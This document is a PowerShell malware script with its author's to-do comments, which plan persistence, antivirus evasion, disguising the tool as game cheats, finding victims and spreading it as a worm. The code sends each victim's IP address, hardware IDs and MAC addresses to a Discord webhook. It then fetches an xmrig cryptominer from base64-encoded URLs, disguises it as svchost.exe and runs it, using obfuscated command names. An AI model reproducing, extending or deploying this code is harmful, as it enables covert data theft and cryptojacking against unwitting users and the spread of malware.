# persistence needed (fileless registry persistence?)
# make xmrig undetected somehow (fileless miner ?) however it does detect the process not the actual file, so just i reckon make the process hidden (run it as admin so its not killable in task manager)
# dont display the cmd window /
# make xmrig not be a blank screen but just not appear /
# package it up into some cheats for fortnite or sum
# maybe roblox macros 
# fix virus total (add loads of gobbeldy gook vars in original.ps1)
# remove these comments lmao
# make the webhook url encoded b64 so script kiddies cant spam that shit 
# get some victims.
# spread via email and discord ..
# be a good little worm...

$pcName     = $env:COMPUTERNAME;
$userName   = $env:USERNAME;
$uuid       = (Get-WmiObject Win32_ComputerSystemProduct).UUID;
$uptime     = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime;
$os         = Get-CimInstance Win32_OperatingSystem;
$osInfo     = "$($os.Caption) - $($os.Version) ($($os.OSArchitecture))";
$cpu        = Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name;
$gpu        = Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name;
$ramGB      = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2);
$mb         = Get-CimInstance Win32_BaseBoard;
$mbInfo     = "$($mb.Manufacturer) $($mb.Product)";
$drives     = Get-CimInstance Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3} | ForEach-Object { "$($_.DeviceID): $([math]::Round($_.Size / 1GB, 1)) GB" };
$macs       = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' } | Select-Object -ExpandProperty MacAddress;
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip;
$webhookUrl = 'https://discord.com/api/webhooks/1364229648975790151/s6ozqz2IOtEaTUaG7U4D0j6eWKcHqZRodHrMq6QBiCtpvfFxS3nwBeooIgkDj3XX4DPa';
$payload = @{username = "PC Info Logger";embeds = @(@{title = "PC System Info - $userName@$pcName";color = 65352;fields = @(@{ name = "IP"; value = "$ip"; inline = $false },@{ name = "UUID"; value = "$uuid"; inline = $true }, @{ name = "Uptime Since"; value = "$uptime"; inline = $false }, @{ name = "OS"; value = "$osInfo"; inline = $false }, @{ name = "CPU"; value = "$cpu"; inline = $false }, @{ name = "GPU"; value = "$gpu"; inline = $false }, @{ name = "RAM"; value = "$ramGB GB"; inline = $true }, @{ name = "Motherboard"; value = "$mbInfo"; inline = $false }, @{ name = "Drives"; value = "$drives"; inline = $false }, @{ name = "MAC Addresses"; value = "$macs"; inline = $false }; ); footer = @{ text = "Made by drkst_shdw" }; timestamp = (Get-Date).ToString("o")})} | ConvertTo-Json -Depth 4;
irm -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json';
if ($gpu -match "nvidia|gtx|rtx|geforce") {
    $base64Url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL2VuY29kZWQudHh0";
    $url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64Url));
    $webRequest = Invoke-WebRequest $url;
    $decodedBytes = [Convert]::FromBase64String($webRequest.Content);
    
    try { Set-ExecutionPolicy RemoteSigned -Scope CurrentUser; } catch {};
    
    function Test-IsAdmin {
        $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());
        return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);
    }

    $extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities";
    $deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
    $zipFilePath = "$extractPath\download.zip";
    $cudaPath = "$deepExtractPath\cuda.zip";
    $configPath = "$deepExtractPath\config.json";

    if (Test-Path $extractPath) { Remove-Item -Recurse -Force $extractPath; }
    New-Item -ItemType Directory -Path $extractPath | Out-Null

    [System.IO.File]::WriteAllBytes($zipFilePath, $decodedBytes);
    Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force;
    rm $zipFilePath
    $cudaUrl = "https://github.com/xmrig/xmrig-cuda/releases/download/v6.22.0/xmrig-cuda-6.22.0-cuda12_4-win64.zip"
    iwr -Uri $cudaUrl -OutFile $cudaPath
    Expand-Archive -Path $cudaPath -DestinationPath $deepExtractPath -Force
    $sourceFolder = Join-Path $extractPath "System Utilities\xmrig-cuda-6.22.0"
    $destinationFolder = $deepExtractPath

    # Get all files in the nested "System Utilities" folder
    $files = Get-ChildItem -Path $sourceFolder

    # Move all files to the parent "System Utilities" folder
    foreach ($file in $files) {
        $destinationPath = Join-Path $destinationFolder $file.Name
        Move-Item -Path $file.FullName -Destination $destinationPath -Force
    }

    # Optionally, you can remove the now-empty nested folder (if it's not needed anymore)
    Remove-Item -Path $sourceFolder -Recurse -Force
    rm $cudaPath
    $configUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/config.txt"
    iwr -Uri $configUrl -OutFile $configPath
    $base64Content = Invoke-WebRequest -Uri $configUrl -UseBasicParsing
    $decodedBytes = [System.Convert]::FromBase64String($base64Content.Content)
    [System.IO.File]::WriteAllBytes($configPath, $decodedBytes)

    $exePath = Join-Path $extractPath "System Utilities\svchost.exe"

    if (Test-IsAdmin) {
        & $exePath
    } else {
        & $exePath -ArgumentList "--background"
    }
}
else{
    $base64Url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rya3N0LXNoZHcvdGVzdHMvcmVmcy9oZWFkcy9tYWluL2VuY29kZWQudHh0";
    $url=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64Url));
    $cmd = [char]105+[char]119+[char]114;
    $webRequest = & $cmd $url;
    $base64Content = $webRequest.Content;
    $decodedBytes = [Convert]::FromBase64String($base64Content);
    try {Set-ExecutionPolicy RemoteSigned -Scope CurrentUser;}catch{};
    function Test-IsAdmin {$currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);};
    $zipFilePath = "C:\Users\$env:USERNAME\Documents\download.zip";
    [System.IO.File]::WriteAllBytes($zipFilePath, $decodedBytes);
    $extractPath = "C:\Users\$env:USERNAME\Documents\System Utilities";
    if (Test-Path $extractPath) {Remove-Item -Recurse -Force $extractPath;};
    Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force;
    $configUrl = "https://raw.githubusercontent.com/drkst-shdw/tests/refs/heads/main/config.txt"
    $deepExtractPath = "C:\Users\$env:USERNAME\Documents\System Utilities\System Utilities"
    $configPath = "$deepExtractPath\config.json";
    $b64Config = iwr -Uri $configUrl
    $base64Content = $b64Config.Content
    $decodedBytes = [System.Convert]::FromBase64String($base64Content)
    [System.IO.File]::WriteAllBytes($configPath, $decodedBytes)
    rm $zipFilePath
    $exePath = Join-Path $extractPath "System Utilities\svchost.exe";
    if (Test-IsAdmin) {
        & $exePath
    } else {
        & $exePath
    }
    # download a file that spreads it
}
